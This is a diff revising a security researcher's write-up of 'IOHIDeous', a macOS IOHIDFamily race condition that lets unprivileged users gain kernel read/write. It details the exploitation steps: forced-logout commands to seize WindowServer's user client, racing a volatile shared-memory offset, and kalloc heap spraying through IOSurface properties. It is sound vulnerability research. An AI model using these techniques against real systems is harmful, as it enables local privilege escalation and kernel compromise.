@@ -1,4 +1,4 @@
-_Siguza, 10. Oct 2017_
+_Siguza, 01. Dec 2017_
 
 # IOHIDeous
 
@@ -8,7 +8,7 @@ _Siguza, 10. Oct 2017_
 
 This is the tale of a macOS-only vulnerability in IOHIDFamily that yields kernel r/w and can be exploited by any unprivileged user.
 
-IOHIDFamily has been notorious in the past for the many race conditions it contained, which ultimately lead to large parts of it being rewritten to make use of command gates, as well as large parts of it being locked down by means of entitlements. I was originally looking through its source in the hope of finding a low-hanging fruit that would let me compromise an iOS kernel, but what I didn't know it then is that some parts of IOHIDFamily exist only on macOS - specifically `IOHIDSystem`, which contains the vulnerability discussed herein.
+IOHIDFamily has been notorious in the past for the many race conditions it contained, which ultimately lead to large parts of it being rewritten to make use of command gates, as well as large parts being locked down by means of entitlements. I was originally looking through its source in the hope of finding a low-hanging fruit that would let me compromise an iOS kernel, but what I didn't know it then is that some parts of IOHIDFamily exist only on macOS - specifically `IOHIDSystem`, which contains the vulnerability discussed herein.
 
 The exploit accompanying this write-up consists of three parts:
 
@@ -21,11 +21,11 @@ The exploit accompanying this write-up consists of three parts:
 
 Note: The `ioprint` and `ioscan` utilities I'm using in this write-up are available from my [iokit-utils](https://github.com/Siguza/iokit-utils) repository. I'm also using my [hsp4 kext][hsp4] along with [kern-utils](https://github.com/Siguza/ios-kern-utils) to inspect kernel memory.
 
-For any kind of questions or feedback, feel free to hit me up on [Twitter](https://twitter.com/s1guza) or via mail (`*@*.net` where `*` = `siguza`).
+For any kind of questions or feedback, feel free to hit me up on [Twitter][me] or via mail (`*@*.net` where `*` = `siguza`).
 
 ## Technical background
 
-In order to understand the attack surface as well as the vulnerability, you need to know about the involved parts of IOHIDFamily. It starts with the [`IOHIDSystem` class](TODO) and the UserClients it offers. There are currently three of those:
+In order to understand the attack surface as well as the vulnerability, you need to know about the involved parts of IOHIDFamily. It starts with the [`IOHIDSystem` class](https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-1035.1.4/IOHIDSystem/IOHIDSystem.cpp.auto.html) and the UserClients it offers. There are currently three of those:
 
 - `IOHIDUserClient`
 - `IOHIDParamUserClient`
@@ -46,11 +46,11 @@ In order to understand the attack surface as well as the vulnerability, you need
     </dict>
     </plist>
 
-This is an important point because as it turns out, IOHIDSystem restricts the amount of `IOHIDUserClient`s that can exist at the same time to one. This is specifically enforced by the `evOpenCalled` class variable, which is set to `true` when an `IOHIDUserClient` is spawned and to `false` again when it is closed. This variable is checked in `IOHIDSystem::evOpen`, which in turn is called from `IOHIDSystem::newUserClientGated` (i.e. we can't even race it).
+This is an important point because as it turns out, IOHIDSystem restricts the number of `IOHIDUserClient`s that can exist at any given time to exactly one. This is specifically enforced by the `evOpenCalled` class variable, which is set to `true` when an `IOHIDUserClient` is spawned and to `false` again when it is closed. This variable is checked in `IOHIDSystem::evOpen`, which in turn is called from `IOHIDSystem::newUserClientGated` (so we can't even race it).
 
-Bottom line, there can only be one `IOHIDUserClient` at any given moment, and chances are that when your code runs, `WindowServer` will be up and running with its UserClient already. So snatching that is not straightforward, but we'll get to that later. For now we're gonna look at what it actually uses that UserClient for.
+Bottom line, there can only be one `IOHIDUserClient` at any given moment, and chances are that when your code runs, `WindowServer` will be long up and running with its UserClient already. So snatching that is not straightforward, but we'll get to that later. For now we're gonna look at what it actually uses that UserClient for.
 
-`IOHIDSystem`/`IOHIDUserClient` offer some shared memory for an event queue that `WindowServer` can map into its address space via `clientMemoryForType`. This memory is split into three parts packed after each other in this order:
+`IOHIDSystem`/`IOHIDUserClient` offer some shared memory for an event queue and certain cursor-related data that `WindowServer` can map into its address space via `clientMemoryForType`. This memory is split into three parts packed after each other in this order:
 
 -   The `EvOffsets` structure.  
     This structs holds information about where the other parts of the shared memory are located in respect to the beginning of the shared memory (so they're given as offsets). The definition is:
@@ -63,19 +63,19 @@ Bottom line, there can only be one `IOHIDUserClient` at any given moment, and ch
     ```
 
 -   The `EvGlobals` structure.  
-    This is where the actual event queue resides, and this makes up 99% of the shared memory. I'll omit the lengthy declaration here, you can view it in [`IOHIDShared.h`](TODO) or see my annotated version in [`data/evg.c`](TODO).
+    This is where the event queue and cursor data reside, and this makes up 99% of the shared memory. I'll omit the lengthy declaration here, you can view it in [`IOHIDShared.h`](https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-1035.1.4/IOHIDSystem/IOKit/hidsystem/IOHIDShared.h.auto.html) or see my annotated version in [`data/evg.c`](../data/evg.c).
 -   Private driver memory.  
     As far as I can see, this remains unused and has a size of 0 bytes.
 
-In `IOHIDSystem`, the extensively used `EvGlobals` address is assigned to an `evg` variable, and although unused, the address of the private driver memory is assigned to an `evs` variable.
+In `IOHIDSystem`, the extensively used `EvGlobals` address is assigned to an `evg` class variable, and (even though unused) the address of the private driver memory is similarly assigned to `evs`.
 
-To initialise that memory, `IOHIDSystem` offers a `createShmem` function which `IOHIDUserClient` implements as external method 0. Like pretty much any IOHIDFamily interface these days, `IOHIDSystem::createShmem` is neatly gated to prevent any concurrent access, and the real implementation resides in `IOHIDSystem::createShmemGated`. On Sierra and earlier that function actually allocated the shared memory if necessary, but since High Sierra (or IOHIDFamily version 1035.1.4) that duty has been shifted to `IOHIDSystem::init`. Regardless, all code paths eventually end up at `IOHIDSystem::initShmem`, which is responsible for cleaning and initialising the actual data structures.
+To initialise that memory, `IOHIDSystem` offers a `createShmem` function which `IOHIDUserClient` implements as external method `0`. Like pretty much any IOHIDFamily interface these days, `IOHIDSystem::createShmem` is neatly gated to prevent any concurrent access, and the real implementation resides in `IOHIDSystem::createShmemGated`. On Sierra and earlier that function actually allocated the shared memory if necessary, but since High Sierra (or IOHIDFamily version 1035.1.4) that duty has been shifted to `IOHIDSystem::init`. Regardless, all code paths eventually end up at `IOHIDSystem::initShmem`, which is responsible for cleaning and initialising the actual data structures.
 
 And that's where it gets interesting.
 
 ## The vulnerability
 
-This is the beginning of `IOHIDSystem::initShmem`, which contains the vulnerability:
+This is the beginning of `IOHIDSystem::initShmem`, containing the vulnerability:
 
 ```c++
 int  i;
@@ -100,7 +100,7 @@ evg = (EvGlobals *)((char *)shmem_addr + eop->evGlobalsOffset);
 evs = (void *)((char *)shmem_addr + eop->evShmemOffset);
 ```
 
-Can you spot it? What if I told you that this function can be called with the shared memory already mapped in the calling task, and that `EvOffsets` is declared as `volatile`? :P
+Can you spot it? What if I told you that this function can be called when the shared memory is already mapped in the calling task, and that `EvOffsets` is declared as `volatile`? :P
 
 The thing is that between this line:
 
@@ -116,7 +116,7 @@ evg = (EvGlobals *)((char *)shmem_addr + eop->evGlobalsOffset);
 
 The value of `eop->evGlobalsOffset` can change, which will then cause `evg` to point to somewhere other than intended.
 
-From looking [at the source](TODO), this vulnerability seems to have been present ever since the kext's original release back in 2002.
+From looking [at the source](https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-33/IOHIDSystem/IOHIDSystem.cpp.auto.html), this vulnerability seems to have been present at least since as far back as 2002. There also used to be a copyright notice from NeXT Computer, Inc. noting an `EventDriver.m` - such a file is nowhere to be found on the web, but if the vulnerable code came from there and if the dates in the copyright notice are to be trusted, that would put the origin of the bug even 10 years further back (older than myself!), but I don't know that so I'm just gonna assume it came to life in 2002.
 
 ## Putting the exploit together
 
@@ -124,18 +124,18 @@ The fun part. :P
 
 ### Getting access
 
-Before we can do anything else, we have to look at how we can actually get access to thing we wanna play with, i.e. how we can spawn an `IOHIDUserClient` when `WindowServer` is holding the only available, and is there before us.
+Before we can do anything else, we have to look at how we can actually get access to thing we wanna play with, i.e. how we can spawn an `IOHIDUserClient` when `WindowServer` is holding the only available one.
 
-The first option I implemented was to just get `WindowServer`'s task port and "steal" its client with `mach_port_extract_right`. Works like a charm, the only problem is that this requires you to be root, and SIP to be disabled.
+The first option I implemented was to just get `WindowServer`'s task port and "steal" its client with `mach_port_extract_right`. Works like a charm, the only problem is that this requires both you to be root and SIP to be disabled.
 
-The next lower option is to simply `kill -9 WindowServer`. Still requires root, but at least that works with SIP fully enabled. `WindowServer` goes down, its UserClient gets cleaned up and we have plenty of time to spawn our own. As a side effect, you'll also notice the system's entire graphical interface going down along with `WindowServer` - so we're not exactly stealthy at this point.
+The next lower option is to simply `kill -9 WindowServer`. Still requires root, but at least that works with SIP enabled. `WindowServer` goes down, its UserClient gets cleaned up and we have plenty of time to spawn our own. As a side effect, you'll also notice the system's entire graphical interface going down along with `WindowServer` - so we're not exactly stealthy at this point.
 
 I did some more digging and found that `WindowServer` actually lets go of its UserClient for a few seconds when a user logs out - more than enough time for us to grab it. So finally we have something that doesn't require us to run as root, but merely as the currently logged-in user, since we can easily force a logout with:
 
     launchctl reboot logout
 
 But can we go lower? Can we do this as any unprivileged user? TL;DR: Yes we can!  
-First, we can try with some AppleScript trickery. `loginwindow` implements something called "AppleEventReallyLogOut" or "aevtrlgo" for short, which attempts to log the user out without a confirmation dialogue. For reasons of general insanity, `loginwindow` does not seem to verify where this event is coming from, so any unprivileged account such as, say, `nobody`, can get away with this:
+First, we can try with some AppleScript trickery. `loginwindow` implements something called "AppleEventReallyLogOut" or "aevtrlgo" for short, which attempts to log the user out without a confirmation dialogue. For reasons of apparent insanity, `loginwindow` does not seem to verify where this event is coming from, so any unprivileged account such as, say, `nobody`, can get away with this:
 
     osascript -e 'tell application "loginwindow" to «event aevtrlgo»'
 
@@ -150,24 +150,24 @@ So in order to maximise our success rate, we do the following:
 3. If the former failed, run `osascript -e 'tell application "loginwindow" to «event aevtrlgo»'`.
 4. Try spawning the desired UserClient repeatedly. Whether we succeeded in logging the user out doesn't matter at this point, we'll just wait for a manual logout/shutdown/reboot if not. So as long as the return value of `IOServiceOpen` is `kIOReturnBusy`, we keep looping.
 
-_This is implemented in [`src/hid/obtain.c`](TODO) with some parts residing in [`src/hid/main.c`](TODO)._
+_This is implemented in [`src/hid/obtain.c`](../src/hid/obtain.c) with some parts residing in [`src/hid/main.c`](../src/hid/main.c)._
 
 ### Triggering the bug
 
-With access secured, we can now get to triggering our bug. It's obvious that we _can_ be lucky enough to modify `eop->evGlobalsOffset` just in the right moment - but how likely is that, and what can go wrong? There are three possible outcomes:
+With access secured, we can get to triggering our bug. It's obvious that we _can_ be lucky enough to modify `eop->evGlobalsOffset` just in the right moment - but how likely is that, and what can go wrong? There are three possible outcomes:
 
-- We lose the race, i.e. `evg` is set to what it should be.
+- We lose the race, i.e. `evg` is set to what IOHIDFamily intends it to be.
 - We win the race, manage to offset `evg`, and `evg` now points to a data structure we placed on the heap.
 - We win the race, but `evg` lands in something other than we intended.
 
-The last case will probably cause a panic sooner (unmapped memory) or later (corruption of some data structure). Luckily I've had this happen only very rarely. Because of that, and because we cannot repair any such corruption anyway, we're just gonna focus on the other two cases. The first one is undesirable but unproblematic (we can just try again), and the second one is the one we want. Thanks to the initialisation performed by `IOHIDSystem`, we can even detect which of those happened: first the entire shared memory (with the correct address) is `bzero`'ed, and afterwards many fields are set (with the offset address), some of which hold a constant value `!= 0`. After calling the initialisation routine, we can query any such field and if it holds `0`, `evg` was offset, otherwise we failed. I chose the `version` field in my implementation.
+The last case will probably cause a panic sooner (unmapped memory) or later (corruption of some data structure). Luckily I've had this happen only very rarely. Because of that, and because we cannot repair any such corruption anyway, we're just gonna focus on the other two cases. The first one is undesirable but unproblematic (we can just try again), and the second one is the one we want. Thanks to the initialisation performed by `IOHIDSystem`, we can even detect which of those happened: first the entire shared memory (using the correct address) is `bzero`'ed, and afterwards many fields are set (with the offset address), some of which hold a constant value `!= 0`. After calling the initialisation routine, we can query any such field and if it holds `0`, `evg` was offset, otherwise it was not. I chose the `version` field in my implementation.
 
 In conclusion:
 
 - In one thread, we just spam a value to `eop->evGlobalsOffset`.
 - In another thread, we call the initialisation routine until `evg->version == 0`.
 
-_This is implemented in [`src/hid/exploit.c`](TODO). A minimal standalone implementation also exists in [`src/poc/main.c`](TODO)._
+_This is implemented in [`src/hid/exploit.c`](../src/hid/exploit.c). A minimal standalone implementation also exists in [`src/poc/main.c`](../src/poc/main.c)._
 
 ### Shmem basics
 
@@ -187,7 +187,7 @@ int main(void)
 }
 ```
 
-From Sierra 10.12.0 through High Sierra 10.13.0, that yields `0x5ae8`. That's also quite a lot... in other words, we can slap one monster of a memory structure an entire two gigabytes back and forth through memory (that's what inspired the name "IOHIDeous").
+From Sierra 10.12.0 all through High Sierra 10.13.0 <!-- TODO 10.13.1 -->, that yields `0x5ae8`. That's also quite a lot... in other words, we can slap one monster of a memory structure an entire two gigabytes back and forth through memory (that's what inspired the name "IOHIDeous").
 
 Now, a priori we know neither where this structure resides, nor where any other kernel memory lies in respect to it. So far we only know that it is allocated via an `IOBufferMemoryDescriptor`, which for `kIOMemoryKernelUserShared` goes through `iopa_alloc`, and subsequently maps the memory into the provided task, if any - in this case the `kernel_task`, so the mapping ends up on the `kernel_map`. Knowing its sharing type and (rounded) size, we can easily find it with `kmap`:
 
@@ -225,10 +225,12 @@ And on High Sierra:
     ffffff8205531000
     ffffff82096c0000
 
-Those look like arbitrary locations on the heap, which doesn't give us much. In order to do further statistics, we need to know what we're looking for. It seems extremely unlikely that we can find some structure with a fixed offset from our shared memory, so our best bet is most likely to make a lot of allocations, which might give us a _chance_ of an allocated structure appearing at a fixed offset... so let's look at where allocations go. The prime kernel memory allocator used by virtually all of IOKit is `kalloc`. Allocations smaller or equal to two page sizes (`0x2000` on x86(_64), `0x8000` on arm(64)), are passed on to `zalloc` with a corresponding `kalloc.X` zone handle. Allocations larger than two page sizes to go the `kalloc_map` first, and if that becomes full, directly to the `kernel_map` (allocations _a lot_ larger than two page sizes go directly to the `kernel_map`, but that doesn't affect us here).  
+This doesn't give us much, since these just look like arbitrary locations on the heap. In order to do further statistics, we need to know what we're looking for. It seems extremely unlikely that there would be some structure at a fixed offset from our shared memory, so our best bet is most likely to make a lot of allocations so as to _place_ a certain structure at a fixed offset.
+
+So let's look at where allocations go. The prime kernel memory allocator used by virtually all of IOKit is `kalloc`. Allocations smaller or equal to two page sizes (`0x2000` on x86(_64), `0x8000` on arm(64)), are passed on to `zalloc` with a corresponding `kalloc.X` zone handle. Allocations larger than two page sizes to go the `kalloc_map` first, and if that becomes full, directly to the `kernel_map` (allocations _a lot_ larger than two page sizes go directly to the `kernel_map`, but that doesn't affect us here).  
 So we've got two possible targets: the `kalloc_map` and the `kernel_map`.
 
-We'll first look at the `kernel_map` - that is, the entire virtual address space of the kernel. Unlike the zalloc zones, maps employ no freelists, so allocations can happen practically anywhere. However, unless explicitly told not to, the `vm_map_*` functions (through which both `kalloc` and `IOMemoryDescriptor` go) always put an allocation in the lowest free address gap that is large enough. This doesn't just mean that it's likely that allocations we make are placed next to each other, but also that our shared memory was mapped in the same manner, and that the further we offset from it, the more likely an address is to still be free (so we could spray there). On Sierra that translates quite nicely into practice, but on High Sierra I found this way barred by the fact that my own allocations would happen at `ffffff92...` addresses while the shared memory resided around `ffffff82...`. I tracked this back mainly to a 64GB large mapping between the two:
+We'll first look at the `kernel_map` - that is, the entire virtual address space of the kernel. Unlike the zalloc zones, maps employ no freelists, so allocations can happen practically anywhere. However, unless explicitly told not to, the `vm_map_*` functions (through which both `kalloc` and `IOMemoryDescriptor` go) always put allocations in the lowest free address gap large enough for them. This doesn't just mean that it's likely that allocations we make are placed next to each other, but also that our shared memory was mapped in the same manner, and that the further we offset from it, the more likely an address is to still be free (so we could spray there). On Sierra that translates quite nicely into practice, but on High Sierra I found this way barred by the fact that my own allocations would happen at `ffffff92...` addresses while the shared memory resided around `ffffff82...`. I tracked this back mainly to a 64GB large mapping between the two:
 
     bash$ sudo kmap -e | fgrep '64G'
     ffffff820c115000-ffffff920c355000     [  64G] -rw-/-rwx [map prv cp] ffffff820c115000 [0 0 0 0 0] 0000000e/82656611:<         2> 0,0 {         0,         0} VM compressor
@@ -240,7 +242,7 @@ What about the `kalloc_map` then? This is a submap of the `kernel_map` with a fi
     bash$ sudo kmap -e | fgrep 'Kalloc'
     ffffff81bca61000-ffffff81dca61000     [ 512M] -rw-/-rwx [map prv cp] ffffff81bca61000 [0 0 0 0 0] 0000000d/66b19131:<         2> 0,0 {         0,         0} Kalloc
 
-Now that address looks like it could well be in range of our shared memory! I've done a couple of probes across reboots, and have sorted them by the distance between the kalloc map and our shared memory, for memory sizes of 8GB and 16GB:
+Now that address looks like it could well be in range of our shared memory! I've done a couple of probes across reboots, and have sorted them by the distance between the kalloc map and our shared memory, for memory sizes of 8GB and 16GB (the `memsize=N` boot-arg is wicked useful for that):
 
     10.13 8G
     shmem               kalloc start        kalloc end          start diff          end diff
@@ -257,11 +259,11 @@ Now that address looks like it could well be in range of our shared memory! I've
     ffffff820383d000    ffffff81b6a48000    ffffff81d6a48000    000000004cdf5000    000000002cdf5000
     ffffff81efedd000    ffffff81a30df000    ffffff81c30df000    000000004cdfe000    000000002cdfe000
 
-Nice, all differences are less than the 2GB we can offset! (Note that the kalloc addresses are lower than the shmem ones, so 1. the differences are negative and 2. we're really lucky to have our offset value `signed`. :P) I've done the same statistics on Sierra as well (see [`data/shmem.txt`](TODO)), but there all differences are larger than 64GB (as is to be expected). So on High Sierra we'll go for the `kalloc_map`.
+Nice, all differences are less than the 2GB we can offset! (Note that the kalloc addresses are lower than the shmem ones, so 1. the differences are negative and 2. we're really lucky to have our offset value `signed`. :P) I've done the same statistics on Sierra as well (see [`data/shmem.txt`](../data/shmem.txt)), but there all differences are larger than 64GB (as is to be expected). So on High Sierra we'll go for the `kalloc_map`.
 
 Now that we have our targets set, we can look at how to maximise the chance of landing in a structure sprayed by us. On both maps, allocations usually happen at the lowest possible address, so the higher an address, the less likely it should be to have been previously allocated, i.e. the more likely it should be to be allocated by us.
 
-So, for Sierra/the `kernel_map`:
+For Sierra/the `kernel_map` this yields the strategy:
 
 1. Fill the `kalloc_map`.
 2. Make >2GB worth of allocations on the `kernel_map`.
@@ -276,13 +278,13 @@ And for High Sierra/the `kalloc_map`:
 
 Notes:
 
-- `sysctlbyname("hw.memsize")` returns the system memory size, from which the size of the `kalloc_map` can be derived. 
-- The value `-0x30000000` is a bit arbitrary. In order to land inside the `kalloc_map`, we need a negative offset that is larger than the biggest possible difference between the end of the `kalloc_map` and the beginning of our shared memory, but which is also smaller than the smallest possible difference between the _beginning_ of the `kalloc_map` and the beginning of our shared memory. Ideally it should also be as small as possible, so that we land closer to the end of the map. With biggest and smallest observed differences being `-0x2cdfe000` and `-0x399ad000`, I have chosen `-0x30000000` as a conservative guess. It is most likely possible to derive a more fitting value based on the actual memory size (which seems to affect the differences) by doing a lot more statistics, but I eventually grew tired of rebooting, and `-0x30000000` works just fine for me (you can change `KALLOC_OFFSET_AMOUNT` in [`src/hid/config.h`](TODO) if you like a different value better).
-- Making 2GB worth of allocations takes well over 10 minutes on my machine, which is longer than I like to wait. I have found that allocating just 768MB and offsetting by a little bit less than that still worked every time for me though. I have added both configurations to [`src/hid/config.h`](TODO) with the 768MB being the default, and the 2GB one being selectable through a `-DPLAY_IT_SAFE` compiler flag.
+- `sysctlbyname("hw.memsize")` reveals the system memory size, from which the size of the `kalloc_map` can be derived. 
+- The value `-0x30000000` is quite arbitrary. In order to land inside the `kalloc_map`, we need a negative offset that is larger than the biggest possible difference between the end of the `kalloc_map` and the beginning of our shared memory, but which is also smaller than the smallest possible difference between the _beginning_ of the `kalloc_map` and the beginning of our shared memory. Ideally it should also be as small as possible, so that we land closer to the end of the map. With biggest and smallest observed differences being `-0x2cdfe000` and `-0x399ad000`, I have chosen `-0x30000000` as a conservative guess. It is most likely possible to derive a more fitting value based on the actual memory size (which seems to affect the differences) by doing a lot more statistics, but I eventually grew tired of rebooting, and `-0x30000000` works just fine for me - you can change `KALLOC_OFFSET_AMOUNT` in [`src/hid/config.h`](../src/hid/config.h) if you like a different value better.
+- Making 2GB worth of allocations takes well over 10 minutes on my machine, which is longer than I like to wait. I have found that allocating just 768MB and offsetting by a little bit less than that still worked every time for me though. I have added both configurations to [`src/hid/config.h`](../src/hid/config.h) with 768MB being the default, and 2GB being selectable through a `-DPLAY_IT_SAFE` compiler flag.
 
 ### Reading and writing memory
 
-First of all, we have the general problem that we don't know whether offsetting `evg` by a certain amount places it at the beginning of a sprayed memory structure or somewhere in the middle. We do know that allocations start at page boundaries though (including our shared memory), are rounded up to a multiple of the page size, and must be bigger than `0x2000`. But if nothing else helps, we can spray objects of size `0x3000` and then there will be only three possible offsets: `x`, `x + 0x1000` and `x + 0x2000`. So if we can perform our read or write operation multiple times in sequence, we can just do it three times at all offsets, and otherwise we at least get a 1 in 3 chance of getting it right.
+First of all we have the general problem that we don't know whether offsetting `evg` by a certain amount places it at the _beginning_ of a sprayed memory structure or somewhere in the _middle_ of it. We _do_ know that allocations start at page boundaries though (including our shared memory), are rounded up to a multiple of the page size, and must be bigger than `0x2000`. If nothing else helps, we can spray objects of size `0x3000` and then there will be only three possible offsets: `x`, `x + 0x1000` and `x + 0x2000`. So if we can perform our read or write operation multiple times in sequence, we can just do it three times at all offsets. If we can't do that, at least we still get a 1 in 3 chance of getting it right.
 
 Now, writing memory is quite easy, at least as much as 4 bytes are concerned. `IOHIDSystem::initShmem` takes a single argument `bool clean`, which is `false` if the memory has previously existed already, and which is used as follows:
 
@@ -305,20 +307,20 @@ So writing 4 bytes is a simple as:
 1. Put our data in `eventFlags`.
 2. Offset `evg`.
 
-And we have our 4 bytes copied. (Note that `shmem_addr` is used as source rather than `evg`, so we cannot copy anything else than the true `eventFlags`.) Of course the other few dozen kilobytes of memory belonging to the structure are quite a an obstacle when rewriting pointers, as they threaten to lay waste to everything in the vicinity. It turns out that there are quite a lot of gaps though which are left untouched by initialisation and if special care is taken, this method can actually suffice. (Note that there is a call to `bzero` in `initShmem`, but that also uses `shmem_addr` as argument rather than `evg`, so no harm is done to any memory we offset to.)
+And we have our 4 bytes copied. (Note that `shmem_addr` is used as source rather than `evg`, so we cannot copy anything other than the true `eventFlags`.) Of course the other few dozen kilobytes of memory belonging to the structure are quite a an obstacle if we want to rewrite pointers, as they threaten to lay waste to everything in the vicinity. It turns out that there are quite a lot of gaps though which are left untouched by initialisation and if special care is taken, this method can actually suffice. (Note that the call to `bzero` in `initShmem` also uses `shmem_addr` as argument rather than `evg`, so it does no harm either to the memory we offset to.)
 
-_This is implemented in [`src/hid/exploit.c`](TODO)._
+_This is implemented in [`src/hid/exploit.c`](../src/hid/exploit.c)._
 
-For reading memory it is kind of a fundamental requirement though that we don't destroy the target structure, and the same could also still prove very useful for writing. With initialisation pretty much out of our control, the only way we can achieve this is if the initialisation of the target memory runs _after_ the initialisation of our shared memory. In most cases this means we have to reallocate the target objects after offsetting `evg`, but we could also have a buffer that is (re-)filled long after its allocation. The general idea is:
+For reading memory it is kind of a fundamental requirement though that we don't destroy the target structure, and the same could also still prove very useful for writing. With initialisation pretty much out of our control, the only way we can achieve this is if the initialisation of the target memory happens _after_ the initialisation and offsetting of our shared memory. In most cases this means we have to reallocate the target objects after offsetting `evg`, but we could also have a buffer that is (re-)filled long after its allocation. The general idea is:
 
 1. Make a lot of kalloc allocations using objects whose corruption has no bad consequence (e.g. buffers).
 2. Offset `evg`.
 3. Reallocate the memory intersecting `evg` (possibly using different objects).
 4. Perform some read or write operation (we'll get to that in a bit).
 
-Point 3 is a bit tricky to pull off, since there is no straightforward way of telling which objects exactly intersect with `evg`. A naive implementation would just reallocate _all_ sprayed objects - which works, but has terrible performance. So, it's time for some heap feng shui! The `IOSurface` API offers a way to "attach CF property list types to an IOSurface buffer" - more precisely, you can store arbitrarily many results of `OSUnserializeXML` in kernelland, as well as read those back or delete them at any time. Seems like made for our cause! Using that, we can do the following:
+Point 3 is a bit tricky to pull off, since there is no general way of telling which objects exactly intersect with `evg`. A naive implementation would just reallocate _all_ sprayed objects - which works, but has terrible performance. So, it's time for some heap feng shui! The `IOSurface` API offers a way to "attach CF property list types to an IOSurface buffer" - more precisely, you can store arbitrarily many results of `OSUnserializeXML` in kernelland, as well as read those back or delete them at any time. Seems like freaking made for our cause! Using that, we can do the following:
 
-1. Allocate an `IOSurface`.
+1. Create an `IOSurface`.
 2. Spray the heap by attaching lots of `OSString`s to the surface.
 3. Offset `evg`.
 4. Read back the stored strings.
@@ -330,12 +332,37 @@ Point 3 is a bit tricky to pull off, since there is no straightforward way of te
 
 Two notes regarding the use of `OSString`:
 
-1. I would've used `OSData`, but it turns out that has been using `kmem_alloc(kernel_map)` rather than `kalloc` for allocations larger than one page for quite some time, which means that `OSData` buffers will never go to the `kalloc_map` anymore.
-2. The serialised format of an `OSString` does not contain a null terminator (unlike `OSSymbol`), however one is added when instantiating/unserialising it, thus to occupy `N` bytes, the serialised length has to be `N-1`.
+1. I would've used `OSData`, but it turns out that one has been changed to use `kmem_alloc(kernel_map)` rather than `kalloc` for allocations larger than one page. In other words, `OSData` buffers will never go to the `kalloc_map` anymore.
+2. The serialised format of an `OSString` does not contain a null terminator (unlike `OSSymbol`), however one is added when instantiating/unserialising it. Thus to occupy `N` bytes, the serialised length has to actually be `N-1`.
+
+And a note regarding `IOSurface` properties: the exported API only supports CF objects, but for fine-grained control over the data we send as well as for increased performance, I want to use the binary data format directly. For that I go through IOKit functions rather than IOSurface ones, which involves four external method invocations on an `IOSurfaceRootUserClient`:
+
+-   External method `0`.  
+    This creates a new `IOSurface`. As struct input it takes serialised plist properties that specify the surface's attributes (same as what you'd pass to `IOSurfaceCreate`) and as struct output it returns some data of which I only know that it contains an identifier at offset `0x10`. The kernel declares this output as having a max size of `0x6c8` bytes, so I just use this construct:
+    
+    ```c
+    union
+    {
+        char _padding[0x6c8];
+        struct
+        {
+            mach_vm_address_t _pad[2];
+            uint32_t id;
+        } data;
+    } surface;
+    ```
+    
+    Whether that field is truly the surface's ID I don't know, but we have to pass that value to other functions later in order to specify the surface we wanna operate on.
+-   External method `9`.  
+    This attaches a single property with a name to a surface. As struct input it takes serialised plist data, except that they're prefixed with an 8-byte header where the first 4 bytes are the "ID" from above, and the remaining 4 bytes are likely just padding. The property and its name are expected to be contained in a top-level array, with the property being at index `0` and the name at index `1`. It has a 4-byte struct output, but I have no idea what that is.
+-   External method `10`.  
+    This serialises and retrieves either a single named property, or all properties if no name is given. As struct input this method takes the same header as before, but instead of serialised plist data it just takes the property's name as null-terminated C string. As struct output it returns the serialised property (or properties) in binary format.
+-   External method `11`.  
+    This deletes a named property. Struct input is the same as for retrieving a property, and struct output is again 4 bytes whose meaning I don't know.
 
 With that settled, let's look at how we can read and write memory after `evg` has been moved already.
 
-Writing is much simpler, so I'll do that first. We'll just use `eventFlags` again, since there's such a nice function for it:
+Writing is much simpler so I'll do that first. We'll just use `eventFlags` again, since there's such a nice function for it:
 
 ```c++
 void IOHIDSystem::updateEventFlagsGated(unsigned flags, OSObject * sender __unused)
@@ -347,7 +374,7 @@ void IOHIDSystem::updateEventFlagsGated(unsigned flags, OSObject * sender __unus
 }
 ```
 
-Unlike most other functions, this one _isn't_ exported as an external method of any UserClient, but is handled in `setProperties`:
+Unlike most other API functions, this _isn't_ exported as an external method of any UserClient, but is instead handled in `setProperties`:
 
 ```c++
 IOReturn IOHIDSystem::setProperties(OSObject * properties)
@@ -382,11 +409,11 @@ IOReturn IOHIDSystem::setProperties(OSObject * properties)
         | NX_DEVICELCTLKEYMASK | NX_DEVICERCTLKEYMASK)
 ```
 
-I've created a separate program in [`data/flags.c`](TODO) to print that constant, which gave me a value of `0x01ff20ff`. That looks too restrictive to write arbitrary pointers or data, but considering the fact that `evg->eventFlags & ~KEYBOARD_FLAGSMASK` is retained, it might just be enough to modify something in a useful way.
+I've created a separate program in [`data/flags.c`](../data/flags.c) to print that constant, which gave me a value of `0x01ff20ff`. That looks too restrictive to actually _write_ arbitrary pointers or data, but considering the fact that `evg->eventFlags & ~KEYBOARD_FLAGSMASK` is retained, it might just be enough to _modify_ something existing in a useful way.
 
-Now onto reading! This one is a fair bit trickier because most code that reads from `evg` either doesn't export that data elsewhere (which makes sense, since the client should have access to it through shared memory already), or it is ridiculously hard to trigger. For example, a call to `evDispatch` can cause the upper 24 bits of each the `x` and `y` components of `evg->screenCursorFixed` to the shared memory of an `IOFramebuffer`, if the frame buffer has previously been attached via a call to `IOHIDUserClient::connectClient`. That shared memory is readily accessible to us through the `IOFramebufferSharedUserClient`, however in order for the values to actually be copied there, `evg->frame` (which we don't control) has to be between `0` and `3` (inclusive), the cursor has to be on the screen represented by the `IOFramebuffer`, and `evDispatch` actually has to be called. All in all, hardly ideal.
+Now onto reading! This one is a fair bit trickier because most code that reads from `evg` either doesn't export that data elsewhere (which makes sense, since the client should have access to it through shared memory already), or it is ridiculously hard to trigger. For example, a call to `evDispatch` can cause the upper 24 bits of each the `x` and `y` components of `evg->screenCursorFixed` to be copied to the shared memory of an `IOFramebuffer`. That shared memory is readily accessible to us through the `IOFramebufferSharedUserClient`, however in order for the values to actually be copied there, the frame buffer need to have been previously attached to `IOHIDSystem` via a call to `IOHIDUserClient::connectClient`, `evg->frame` (which we don't control) has to be between `0` and `3` (inclusive), the cursor has to be on the screen represented by the `IOFramebuffer`, and `evDispatch` actually has to be called. All in all, hardly ideal.
 
-But there is one more thing that reads from and, as it happens, also writes to `evg`: `_cursorHelper`. This instance of `IOHIDSystemCursorHelper` is used for both coordinate system arithmetic as well as conversion between the fields `evg->cursorLoc`, `evg->screenCursorFixed` and `evg->desktopCursorFixed`. What's important for us is that is has its own separate storage, so it can also act as a cache to some extent. If we can use that to read a value from `evg` at one time and write it back at another, we can copy small amounts of memory to the actual shared memory we have mapped in our task. Now, the "writing back" part is easy enough, if we just look at `IOHIDSystem::initShmem`:
